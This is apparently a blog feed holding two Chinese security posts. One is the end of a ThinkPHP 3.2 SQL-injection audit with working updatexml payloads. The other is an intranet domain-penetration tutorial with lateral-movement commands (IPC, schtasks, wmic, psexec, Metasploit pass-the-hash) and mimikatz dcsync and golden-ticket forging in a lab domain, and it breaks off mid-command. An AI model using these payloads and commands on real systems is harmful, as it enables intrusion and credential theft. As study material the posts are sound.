string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span>   <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseComment</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'comment'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'fetch_sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>在parseSet方法中，可以将传入的参数替换成:0</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/5.png" alt="" loading="lazy"></p><p>在bindParam方法中，$this-&gt;bind属性返回array(‘:0’=&gt;参数值)</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">bindParam</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bind</span><span class="token punctuation">[</span><span class="token string">':'</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">]</span>  <span class="token operator">=</span>   <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进parseWhere-&gt;parseWhereItem方法，当exp为bind时，就会在参数值前面加个冒号(:)</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/6.png" alt="" loading="lazy"></p><p>由于在sql语句中有冒号，继续跟进excute方法，这里将:0替换成了第二个参数的值</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/7.png" alt="" loading="lazy"></p><p>所以最终的payload为</p><pre><code>id[0]=bind&amp;id[1]=0 and 1=(updatexml(1,concat(0x7e,(user()),0x7e),1))&amp;username=fanxing</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/8.png" alt="" loading="lazy"></p><h4 id="find-select-delete注入"><a href="#find-select-delete注入" class="headerlink" title="find/select/delete注入"></a><strong>find/select/delete注入</strong></h4><p>先分析find注入，在控制器中写个漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>当传入id[where]=1p时候，在user进行断点，F7跟进find-&gt;_parseOptions方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/9.png" alt="" loading="lazy"></p><p>$options[‘where’]为字符串，导致不能执行_parseType方法转化数据，进行跟进select-&gt;buildSelectSql-&gt;parseSql-&gt;parseWhere方法，传入的$where为字符串，直接执行了if语句</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseWhere</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 直接使用字符串条件</span>            <span class="token variable">$whereStr</span> <span class="token operator">=</span> <span class="token variable">$where</span><span class="token punctuation">;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$whereStr</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token string">''</span><span class="token punctuation">:</span><span class="token string">' WHERE '</span><span class="token punctuation">.</span><span class="token variable">$whereStr</span><span class="token punctuation">;</span></code></pre><p>当传入id=1p，就不能进行注入了，具体原因在find-&gt;_parseOptions-&gt;_parseType方法，将传入的参数进行了强转化为整形</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/10.png" alt="" loading="lazy"></p><p>所以，payload为</p><pre><code>?id[where]=1 and 1=updatexml(1,concat(0x7e,(user()),0x7e),1)</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/11.png" alt="" loading="lazy"></p><p>select和delete原理同find方法一样，只是delete方法多增加了一个判断是否为空</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 如果条件为空 不进行删除操作 除非设置 1=1</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$pkValue</span>            <span class="token operator">=</span>  <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'where'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$pk</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token boolean">false</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_before_delete</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>   </code></pre><h4 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a><strong>order by注入</strong></h4><p>先在控制器中写个漏洞demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'eq'</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">M</span><span class="token punctuation">(</span><span class="token string">'User'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">order</span><span class="token punctuation">(</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'order'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在user变量处断点，F7跟进，find-&gt;select-&gt;buildSelectSql-&gt;parseSql方法</p><pre class=" language-php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">parseOrder</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">,</span></code></pre><p>当$options[‘order’]参数参在时，跟进parseOrder方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/12.png" alt="" loading="lazy"></p><p>当不为数组时，直接返回order by + 注入pyload，所以注入payload为</p><pre><code>order=id and(updatexml(1,concat(0x7e,(select user())),0))</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/13.png" alt="" loading="lazy"></p><h4 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a><strong>缓存漏洞</strong></h4><p>在ThinkPHP3.2中，缓存函数有F方法和S方法，两个方法有什么区别呢，官方介绍如下</p><pre><code>F方法：相当于PHP自带的file_put_content和file_get_content函数，没有太多存在时间的概念，是文件存储数据的方式。常用于文件配置。S方法：文件缓存，有生命时长，时间到期后缓存内容会得到更新。常用于单页面data缓存。</code></pre><p>这里F方法就不介绍了，直接看S方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">S</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token function">I</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟进查看S方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/14.png" alt="" loading="lazy"></p><p>set方法写入缓存</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/15.png" alt="" loading="lazy"></p><p>跟进filename方法，此方法获取写入文件的路径，保存在../Application/Runtime/Temp目录下</p><pre class=" language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">filename</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$name</span>    <span class="token operator">=</span>    <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_CACHE_KEY'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_CACHE_SUBDIR'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 使用子目录</span>            <span class="token variable">$dir</span>   <span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string">'DATA_PATH_LEVEL'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$dir</span>    <span class="token punctuation">.</span><span class="token operator">=</span>    <span class="token variable">$name</span><span class="token punctuation">{</span><span class="token variable">$i</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">,</span><span class="token number">0755</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$filename</span>    <span class="token operator">=</span>    <span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$filename</span>    <span class="token operator">=</span>    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'prefix'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string">'temp'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>并将S传入的name进行md5值作为文件名，最终通过file_put_contents函数写入文件。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/16.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;where注入&quot;&gt;&lt;a href=&quot;#where注入&quot; class=&quot;headerlink&quot; title=&quot;where注入&quot;&gt;&lt;/a&gt;&lt;strong&gt;where注入&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在控制器中，写个demo，利用字符串方式作为where传参时存在注
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>内网域渗透知识总结</title>
    <link href="http://yoursite.com/2019/12/31/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/12/31/%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</id>
    <published>2019-12-31T03:30:29.000Z</published>
    <updated>2020-04-29T05:17:33.373Z</updated>
    
    <content type="html"><![CDATA[<h4 id="NTML协议"><a href="#NTML协议" class="headerlink" title="NTML协议"></a><strong>NTML协议</strong></h4><p>在工作组中，密码hash保存在本地的SAM文件中(%SystemRoot%\system32\config\sam)，在域里保存在ntds.dit文件中，hash的格式为：<code>用户名称:SID:LM-Hash值:NT-Hash值</code></p><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:32057716c8bd0647d9197a9db0b041eb:::</code></pre><p>500冒号后面的是LM hash，32057716c8bd0647d9197a9db0b041eb是ntml hash</p><h5 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a><strong>LM Hash</strong></h5><p>LM Hash的全称是LAN Manager Hash，如果明文是<code>dbnames</code>，先要全部转换成大写，然后将大写字符串转换成16进制，如果明文大写转换的二进制不足14个字节，需要用0在后面添加到14个字节</p><pre><code>44424e414d455300000000000000    dbnames的16进制为44424e414d4553</code></pre><p>由于44424e414d4553转换二进制为8字节，所以这两个8字节数据要用魔术字符串<code>KGS!@#$%</code>DES加密</p><pre><code>4B47532140232425     为&#39;KGS!@#$%&#39;的16进制</code></pre><p>将得到的2个8字节作为key对KGS!@#$%进行des加密，可以利用安全客的一篇文章进行<a href="https://www.anquanke.com/post/id/193149#h3-2" target="_blank" rel="noopener">des加密</a></p><pre><code>44424e414d4553作为key为&#39;KGS!@#$%&#39;进行des加密：c8b9d6dc8e553d6300000000000000作为key为&#39;KGS!@#$%&#39;进行des加密：aad3b435b51404ee</code></pre><h5 id="NTML-Hash"><a href="#NTML-Hash" class="headerlink" title="NTML Hash"></a><strong>NTML Hash</strong></h5><p>从Windows Vista开始，密码默认情况是只有存储NTML Hash，LM Hash不会存在，在NTML Hash中，先将字符串进行16进制转换，然后在转换成unicode字符串，最后使用MD4加密算法对Unicode进行加密，所以LM Hash跟NTML相比，LM明文大小写不敏感，可以判断明文是否小于8位，不使用‘KGS!@#$%’作为key进行des加密，而NTML采用单向加密方式(MD4)</p><h5 id="NTML认证协议"><a href="#NTML认证协议" class="headerlink" title="NTML认证协议"></a><strong>NTML认证协议</strong></h5><p>NTML协议认证分为三部分：协商、质询、身份验证验证</p><pre><code>                            1.协商Client &lt;----------------------------------------------------&gt;server                            2.质询(challenge)Client &lt;----------------------------------------------------&gt;server                            3.身份验证Client &lt;----------------------------------------------------&gt;server</code></pre><p>NTML协议认证过程：</p><p>1.用户输入账号密码，客户端中包含明文用用户名向服务端发起请求</p><p>2.服务端接收到客户端的请求，会生成一个challenge 16位随机数，使用存储的NTML Hash加密challenge，生成challenge1，然后将challenge的16位明文随机数发送给客户端</p><p>3.客户端接收到challenge后，使用用户登录的密码hash加密challenge生成response(challenge2)，将这个response发送给客户端</p><p>4.服务端接收到response，对challenge1和challenge2进行比较，相同的话就验证成功</p><h5 id="NTLM-v1与NTLM-v2"><a href="#NTLM-v1与NTLM-v2" class="headerlink" title="NTLM v1与NTLM v2"></a><strong>NTLM v1与NTLM v2</strong></h5><p>challenge：NTML v1是8的随机数；NTML v2是16位的随机数</p><p>Net-NTML Hash：</p><p>1.NTML v1采用的是DES加密，在16字节后面填充5个0，组成21字节，然后分成3组7个字节的，并在每7个字节后面填充1个0，成为3个8字节的DES密钥，加密上诉步骤2(server)发来的challenge，组成24字节的密文。</p><p>2.NTML v2采用的HMAC-MD5加密</p><h4 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a><strong>Kerberos协议</strong></h4><p>在域环境中，主要采用的是kerberos协议，主要有下面几个角色</p><p>1.AS：为客户端生成TGT服务</p><p>2.TGS：为客户端生成某个服务的ticket</p><p>3.KDC：安全认证中票据生成管理服务，里面包含AS和TGS</p><p>4.AD：存储整个域内的所有计算机，用户等信息</p><h5 id="Kerberos协议认证过程"><a href="#Kerberos协议认证过程" class="headerlink" title="Kerberos协议认证过程"></a><strong>Kerberos协议认证过程</strong></h5><p><img src="https://bbs.ichunqiu.com/data/attachment/forum/201912/31/102901ze0er0rhuutesc5y.png.thumb.jpg" alt="1" loading="lazy"></p><p>1.客户端向KDC(AS)发起一个认证请求(KRB_AS_REQ)，在请求的过程中，是通过用户的密码hash加密的时间戳，然后发送给AS服务器，AS服务器接收到后，采用服务器那边的密码hash进行解密这个时间戳，解密成功后，并且时间戳在一定时间范围，说明认证成功。<br> 2.AS对比用户是否在本地数据库中，使用客户端的hash进行解密，正确就返回krbtgt的密码hash加密的TGT票据(到期时间一般为8小时)，用户是无法解密这个TGT票据的，但是有了krbtgt的hash，就可以伪造’黄金票据’。还要返回一个由客户端用户ntml hash加密的Session Key(sessionkey1)，Session  Key是KDC接收请求后的随机生成的字符(KRB_AS_REP)。<br> 3.客户端用自己的密码hash解密Session Key，TGT是KDC加密的，Client无法解密，Client拿着解密出来的SessionKey去加密时间戳和TGT发送给TGS换取访问Server的票据(KRB_TGS_REQ)。<br> 4.TGS收到Client的请求后，会验证是否存在客户端要访问的这个服务，存在的话KDC使用krbtgt的密码hash对TGT进行解密，然后会查看TGT中的时间戳，看是否TGT失效，如果解密成功的TGT没有失效，向客户端发送通过sessionkey1加密的Session_key和ticket票据，在TGSREP中，用的是服务的hash加密ticket的，所有我们拥有这个服务的hash就可以制作一个ticket(即白银票据)(KRB_TGS_REP)。<br> 5.客户端拿着自己sessionkey1解密的Session_Key(sessionkey2)，然后把sessionkey2加密的时间戳和ticket发送个Server去访问服务，认证通过就可以访问(KRB_AP_REQ)。<br> 6.服务使用自己的hash去解密ticket票据，得到sessionkey2，在用sessionkey2去解密时间戳，解密成功，就用PAC去KDC问客户端是否有访问的权限，域控解密PAC，用于让客户端识别是否访问正确的服务端(KRB_AP_REP)。</p><h4 id="内网横向移动的方法"><a href="#内网横向移动的方法" class="headerlink" title="内网横向移动的方法"></a><strong>内网横向移动的方法</strong></h4><h5 id="ipc连接"><a href="#ipc连接" class="headerlink" title="ipc连接"></a><strong>ipc连接</strong></h5><pre><code>net use \\192.168.1.232\C$ admin123456 /user:fanxing.com\fanxing</code></pre><p>复制文件到主机上</p><pre><code>copy 1.bat \\192.168.1.232\c$\tools</code></pre><p>获取服务器的时间</p><pre><code>net time \\192.168.1.232</code></pre><p>创建计划任务，20:05执行1.bat文件，cobaltstrike上线成功</p><pre><code>at \\192.168.1.232 20:05 c:\tools\1.bat</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/3.png" alt="" loading="lazy"></p><p>下面是ipc连接当中常见的错误号：</p><pre><code>错误号5：拒绝访问---&gt;使用的权限太低，需要提权错误号51：Windows无法找到网络路径，网络有问题错误号53：找不到网络路径，ip地址错误、目标未开机、目标lanmanserver服务未开启、目标有防火墙(端口过滤)错误号67：找不到网络名-&gt;你的lanmanworkstation服务未启动或者目标删除了ipc$错误号1219：提供的凭据与已存在的凭据集冲突-&gt;你已经和对方建立了一个ipc，请删除在连接错误号1326：未知的用户名或错误密码错误号1792：试图登录，但是网络登录服务没启动-&gt;目标BetLogon服务未启动错误号2242：此用户的密码已经过期-&gt;目标有账号策略，强制定期要求更改密码</code></pre><h5 id="schtasks创建计划任务"><a href="#schtasks创建计划任务" class="headerlink" title="schtasks创建计划任务"></a><strong>schtasks创建计划任务</strong></h5><p>设置每天晚上8:40执行1.bat文件</p><pre><code>schtasks /create /s 192.168.1.232 /u fanxing.com\fanxing /p admin@163.com /ru &quot;SYSTEM&quot; /tn fanxing /sc DAILY /st 20:40  /tr c:\tools\1.bat /F</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/4.png" alt="" loading="lazy"></p><h5 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a><strong>WMI</strong></h5><p>wmi服务需要开启135端口，这个是默认开启的。</p><pre><code>wmic /node:192.168.1.232 /user:fanxing.com\fanxing /password:admin@163.com process call create &quot;cmd /c 1.exe&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/5.png" alt="" loading="lazy"></p><p>使用wmic没有任何回显，可以wmicexec.vbs解决无回显的问题，或者获取一个半交互式shell。</p><pre><code>cscript wmiexec.vbs /cmd 192.168.1.232 fanxing.com\fanxing admin@163.com whoami</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/6.png" alt="" loading="lazy"></p><h5 id="pstools"><a href="#pstools" class="headerlink" title="pstools"></a><strong>pstools</strong></h5><p>pstools中有13个小工具，这里主要利用psexec进行远程执行命令，唯一的缺点就是会开启一个服务，容易被管理员发现。</p><p>在ipc建立连接的时候，可以直接使用psexec:</p><pre><code>psexec.exe \\192.168.1.232 -h cmd /c &quot;whoami&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/7.png" alt="" loading="lazy"></p><p>当ipc没有连接时</p><pre><code>Psexec.exe \\192.168.1.232 -u fanxing.com\fanxing -p admin@163.com -h cmd /c &quot;whoami&quot;</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/8.png" alt="" loading="lazy"></p><p>使用metasploit执行</p><pre><code>use auxiliary/admin/smb/p**ec_commandset rhosts 192.168.1.232set smbuser fanxingset smbpass admin@163.comset smbdomain fanxing.comset command whoami</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/9.png" alt="" loading="lazy"></p><h5 id="hash传递-PTH"><a href="#hash传递-PTH" class="headerlink" title="hash传递(PTH)"></a><strong>hash传递(PTH)</strong></h5><p>hash传递是通过密码的hash访问主机或者服务，不需要明文登录。hash的原理，出现在上面讲的NTML认证过程的challenge。利用metasploit：</p><pre><code>use exploit/windows/smb/psexecset rhosts 192.168.50.233set SMBPass 32057716c8bd0647d9197a9db0b041ebset SMBUser administratorset SMBDomain fanxing.com</code></pre><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a><strong>黄金票据</strong></h4><p>黄金票据是AS颁发给Client的TGT票据(TGT的有效时间为20分钟)，是通过域kerberos账户(KRBTGT)加密的。实现原理就是跳过了AS的认证过程，直接向KDC的TGS服务证明通过了AS服务。一般黄金票据都是域控的权限掉了的时候，修改了域控的密码，而krbtgt的密码没有被修改，就可以重新获取到域控权限。</p><p>满足黄金票据的条件有：</p><p>1.域的名称</p><p>2.域的SID值</p><p>3.域中KRBTGT的密码hash</p><p>4.伪造的用户名</p><p>在金票的利用过程中，可以使用mimikatz，cobaltstrike，metasploit来伪造。</p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><strong>Mimikatz</strong></h5><p>导出krbtgt的NTML Hash</p><pre><code>privilege::debug      #提权lsadump::dcsync /domain:fanxing.com /user:krbtgt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/10.png" alt="" loading="lazy"></p><p>获取域的SID值，不要后面的-500</p><pre><code>whoami /all</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/11.png" alt="" loading="lazy"></p><p>伪造金票</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /aes256:3df036f90aaf3a63a5cce96fc753f08beb5a2e61946e17cc7d5e6ce04b651b89 /user:fanxing /ticket:gold.kirbi</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/12.png" alt="" loading="lazy"></p><p>导入Golden Ticket</p><pre><code>kerberos::ptt c:\users\test\gold.kirbi</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/13.png" alt="" loading="lazy"></p><p>可以使用dir访问域控目录，要输入主机名，使用ip还是访问不到</p><pre><code>dir \\WIN-M34UCFJIPNQ\c$</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/14.png" alt="" loading="lazy"></p><p>mimikatz还有另外一中方法</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /rc4:8b3955c065502e33716d555d4421a723 /user:fanxing /ptt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/15.png" alt="" loading="lazy"></p><h5 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a><strong>CobaltStrike</strong></h5><p>在上线之后-&gt;执行-&gt;黄金票据</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/16.png" alt="" loading="lazy"></p><h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><strong>Metasploit</strong></h5><p>msf制作金票</p><pre><code>load kiwi</code></pre><p>生成Golden Ticket</p><pre><code>golden_ticket_create -d fanxing.com -k 8b3955c065502e33716d555d4421a723 -s S-1-5-21-3408186607-3793295459-3581146574 -u fanxing -t 